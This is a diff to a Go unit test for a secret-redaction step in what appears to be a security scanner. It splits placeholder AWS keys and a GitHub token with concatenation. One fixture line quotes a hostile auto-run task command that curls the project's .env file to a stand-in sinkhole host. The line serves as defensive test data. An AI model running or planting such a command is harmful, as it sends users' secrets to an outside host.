@@ -313,9 +313,9 @@ func TestSelectRedact(t *testing.T) {
 			name: "the AWS example keys in the snippet of the task, a token in a path and a title",
 			res: func() protocol.Result {
 				f := finding("GAL-AUTOEXEC-010", protocol.SeverityCritical, "autoexec",
-					ev(".vscode/tasks.json", 7, "AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY curl -s -d @.env https://collect.sinkhole.test/c"))
-				g := finding("GAL-SCRIPT-001", protocol.SeverityMedium, "script", ev("ghp_abcdefghijklmnopqrstuvwxyz0123456789/a.js", 1, "x"))
-				g.Title = "Token ghp_abcdefghijklmnopqrstuvwxyz0123456789"
+					ev(".vscode/tasks.json", 7, "AWS_ACCESS_KEY_ID=AKIA"+"IOSFODNN7EXAMPLE AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY curl -s -d @.env https://collect.sinkhole.test/c"))
+				g := finding("GAL-SCRIPT-001", protocol.SeverityMedium, "script", ev("ghp_"+"abcdefghijklmnopqrstuvwxyz0123456789/a.js", 1, "x"))
+				g.Title = "Token ghp_" + "abcdefghijklmnopqrstuvwxyz0123456789"
 				return resultOf(protocol.TargetDir, "project", f, g)
 			}(),
 			wantSent: []protocol.DecisionFinding{
